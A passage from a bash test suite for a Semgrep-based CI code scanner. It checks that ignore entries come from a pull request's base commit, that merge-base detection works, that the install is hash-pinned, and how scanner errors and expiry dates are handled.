# (IGNORE_BASE_REF), so a pull request can't suppress its own finding.
# base_case NAME TOML_AT_BASE TOML_AT_HEAD builds a repository whose first
# commit (the base) holds the ignored fixture with TOML_AT_BASE as its ignore
# file (none when empty) and whose second commit sets TOML_AT_HEAD.
base_case() {
  local dir=$test_root/$1
  prepare "$1" ignored
  rm -f "$dir/.github/code-scan-ignore.toml"
  [[ -z $2 ]] || printf '%s\n' "$2" > "$dir/.github/code-scan-ignore.toml"
  git_init "$dir"
  if [[ -z $3 ]]; then rm -f "$dir/.github/code-scan-ignore.toml"; else printf '%s\n' "$3" > "$dir/.github/code-scan-ignore.toml"; fi
  git -C "$dir" add -A
  git -C "$dir" -c user.name=test -c user.email=test@example.com commit -q --allow-empty -m head
}
suppress=$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2027-04-30')

base_case base-ignore-added-in-pr '' "$suppress"
run_case base-ignore-added-in-pr ignored 1 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1'
expect_findings base-ignore-added-in-pr 'process-execution scripts/graphql.ts:1'
expect_output base-ignore-added-in-pr 'This pull request changes the ignore file' 'take effect only after it merges'
# Without a base ref the working tree's file applies, as before.
base_case head-ignore-added-in-pr '' "$suppress"
run_case head-ignore-added-in-pr ignored 0 TODAY=2026-10-29

base_case base-ignore-kept "$suppress" "$suppress"
run_case base-ignore-kept ignored 0 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1'
expect_output base-ignore-kept 'suppressed: process-execution scripts/graphql.ts'

# The ignore file under a subdirectory path is read from the same place at
# the base.
dir=$test_root/base-ignore-subdir
mkdir -p "$dir"
prepare base-ignore-subdir-content ignored
mv "$test_root/base-ignore-subdir-content" "$dir/sub"
printf '%s\n' "$suppress" > "$dir/sub/.github/code-scan-ignore.toml"
git_init "$dir"
printf '# head\n' >> "$dir/sub/.github/code-scan-ignore.toml"
git -C "$dir" add -A
git -C "$dir" -c user.name=test -c user.email=test@example.com commit -q -m head
run_case base-ignore-subdir ignored 0 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1' "SCAN_PATH=$dir/sub"
expect_output base-ignore-subdir 'suppressed: process-execution scripts/graphql.ts'

# A base ref that doesn't resolve fails closed.
base_case base-ignore-bad-ref "$suppress" "$suppress"
run_case base-ignore-bad-ref ignored 2 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD~5'
expect_output base-ignore-bad-ref 'IGNORE_BASE_REF'

# So does an ignore path that is a directory at the base.
base_case base-ignore-dir '' "$suppress"
dir=$test_root/base-ignore-dir
git -C "$dir" checkout -q HEAD^1
rm -f "$dir/.github/code-scan-ignore.toml"
mkdir -p "$dir/.github/code-scan-ignore.toml"
printf 'x\n' > "$dir/.github/code-scan-ignore.toml/x"
git -C "$dir" add -A
git -C "$dir" -c user.name=test -c user.email=test@example.com commit -q -m dir-base
rm -rf "$dir/.github/code-scan-ignore.toml"
printf '%s\n' "$suppress" > "$dir/.github/code-scan-ignore.toml"
git -C "$dir" add -A
git -C "$dir" -c user.name=test -c user.email=test@example.com commit -q -m file-head
run_case base-ignore-dir ignored 2 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1'
expect_output base-ignore-dir 'not a regular file at'

# The pull request's own ignore file is still validated, though its entries
# don't apply: a broken file would otherwise merge and fail every later scan.
base_case base-head-invalid-toml "$suppress" 'not = [valid toml'
run_case base-head-invalid-toml ignored 2 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1'
expect_output base-head-invalid-toml "the pull request's ignore file"
base_case base-head-missing-fields "$suppress" "$(entry process-execution scripts/graphql.ts)"
run_case base-head-missing-fields ignored 2 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1'
expect_output base-head-missing-fields 'reason'

# The usual validation applies to the base file.
expired=$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2026-10-28')
base_case base-expired "$expired" "$expired"
run_case base-expired ignored 1 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1'
expect_output base-expired 'expired' 'base commit'
base_case base-unknown-key "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2027-04-30' 'owner = "me"')" "$suppress"
run_case base-unknown-key ignored 2 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1'
expect_output base-unknown-key 'owner' 'base commit'

# The summary names the source of the entries and says when new ones apply.
base_case base-summary "$suppress" "$suppress"
summary=$test_root/base-summary.md
run_case base-summary ignored 0 TODAY=2026-10-29 'IGNORE_BASE_REF=HEAD^1' "GITHUB_STEP_SUMMARY=$summary"
base_short=$(git -C "$test_root/base-summary" rev-parse --short HEAD^1)
output=$(cat "$summary")
expect_output base-summary "Ignore entries read from the base commit $base_short" 'takes effect only after it merges'
expect_no_line_matching base-summary 'ignore-base\.toml'

# pr-base.sh picks the base of a pull request's merge checkout: the first
# parent, after checking that the second parent is the pull request's head.
# The event's base.sha can lag the merge ref, so it isn't used.
dir=$test_root/pr-base
mkdir -p "$dir"
git -C "$dir" init -q
git -C "$dir" -c user.name=test -c user.email=test@example.com commit -q --allow-empty -m root
git -C "$dir" checkout -q -b feature
git -C "$dir" -c user.name=test -c user.email=test@example.com commit -q --allow-empty -m feature
head_sha=$(git -C "$dir" rev-parse HEAD)
git -C "$dir" checkout -q -
git -C "$dir" -c user.name=test -c user.email=test@example.com commit -q --allow-empty -m base
base_sha=$(git -C "$dir" rev-parse HEAD)
git -C "$dir" -c user.name=test -c user.email=test@example.com merge -q --no-ff --no-edit feature
pr_base() { # pr_base NAME EXPECTED_STATUS HEAD_SHA [EXPECTED_OUTPUT]
  output=$(PULL_REQUEST_HEAD_SHA=$3 bash "$script_dir/pr-base.sh" "$dir" 2>&1) && status=0 || status=$?
  if [[ $status -eq $2 && ( -z ${4:-} || $output == "$4" ) ]]; then
    report "$1" true "exit $status"
  else
    report "$1" false "exit $status, output '$output'; want $2 ${4:-}"
  fi
}
pr_base pr-base-merge 0 "$head_sha" "$base_sha"
pr_base pr-base-stale-head 2 "$base_sha"
pr_base pr-base-no-head 2 ''
git -C "$dir" checkout -q HEAD^1
pr_base pr-base-not-merge 2 "$head_sha"
# The workflow runs base=$(bash pr-base.sh), which captures stdout, so the
# error must go to stderr to reach the log.
errfile=$test_root/pr-base.err
stdout=$(PULL_REQUEST_HEAD_SHA=$head_sha bash "$script_dir/pr-base.sh" "$dir" 2> "$errfile") && status=0 || status=$?
if [[ $status -eq 2 && -z $stdout ]] && grep -q '^::error title=Code scan::' "$errfile"; then
  report pr-base-error-on-stderr true "exit 2, ::error on stderr"
else
  report pr-base-error-on-stderr false "exit $status, stdout '$stdout', stderr '$(cat "$errfile")'"
fi

# The Semgrep install is locked by hash: every requirement is pinned with ==
# and carries a hash, semgrep is among them, and the installer insists on
# hashes.
if python3 - "$script_dir" <<'PY'
import re, sys
root = sys.argv[1]
lock = open(root + "/requirements.txt").read()
reqs = re.findall(r"^([A-Za-z0-9_.-]+)==([^\s;]+)(?: ;[^\\\n]*)?((?:\s*\\\n\s+--hash=sha256:[0-9a-f]{64})+)", lock, re.M)
names = {r[0].lower() for r in reqs}
lines = [l for l in lock.splitlines() if l and not l.startswith((" ", "#"))]
installer = open(root + "/install-semgrep.sh").read()
ok = reqs and len(reqs) == len(lines) and "semgrep" in names and "--require-hashes" in installer
sys.exit(0 if ok else 1)
PY
then
  report semgrep-hash-locked true "requirements.txt pins and hashes every package; install uses --require-hashes"
else
  report semgrep-hash-locked false "requirements.txt is missing, unhashed, or not used with --require-hashes"
fi

# Feb 29 + 12 months clamps to Feb 28.
cap() {
  printf '[[Ignore]]\nrule = "r"\npath = "p"\nreason = "x"\nignoreUntil = %s\n' "$2" > "$test_root/cap.toml"
  echo '{"results":[]}' > "$test_root/cap.json"
  output=$(python3 "$script_dir/filter.py" --results "$test_root/cap.json" --ignore-file "$test_root/cap.toml" \
    --scan-root "$test_root" --today "$1" 2>&1) && status=0 || status=$?
  if [[ $status -eq $3 ]]; then report "cap-$1-$2" true "exit $status"; else report "cap-$1-$2" false "exit $status, want $3"; fi
}
cap 2028-02-29 2029-02-28 0
cap 2028-02-29 2029-03-01 2

# Timeouts and out-of-memory errors are warnings to Semgrep, which skips the
# file; list-findings.py must still treat them as scanner errors. Syntax
# errors stay non-fatal.
classify() {
  printf '{"results":[],"errors":[{"type":"%s","level":"%s","message":"m"}]}' "$1" "$2" \
    > "$test_root/classify.json"
  output=$(python3 "$script_dir/list-findings.py" "$test_root/classify.json" "$test_root/none.toml" "$test_root" 2026-10-29 2>&1) && status=0 || status=$?
  if [[ $status -eq $3 ]]; then
    report "classify-$1" true "exit $status"
  else
    report "classify-$1" false "exit $status, want $3"
  fi
}
classify Timeout warn 2
classify OutOfMemory warn 2
classify 'Timeout error' warn 2
classify 'Out of memory' warn 2
classify 'Fatal: memory exhausted' warn 2
classify 'Partial parsing error' warn 0
classify 'Syntax error' warn 0
classify 'Syntax error' error 2
# Some error types are [name, details]; a file named timeout.js in the details
# doesn't make a parse error fatal.
printf '{"results":[],"errors":[{"type":["PartialParsing",[{"path":"timeout.js"}]],"level":"warn","message":"m"}]}' \
  > "$test_root/classify.json"
output=$(python3 "$script_dir/list-findings.py" "$test_root/classify.json" "$test_root/none.toml" "$test_root" 2026-10-29 2>&1) && status=0 || status=$?
if [[ $status -eq 0 ]]; then report classify-list-type true "exit 0"; else report classify-list-type false "exit $status, want 0"; fi

printf '\n%d passed, %d failed\n' "$passed" "$failed"
[[ $failed -eq 0 ]]
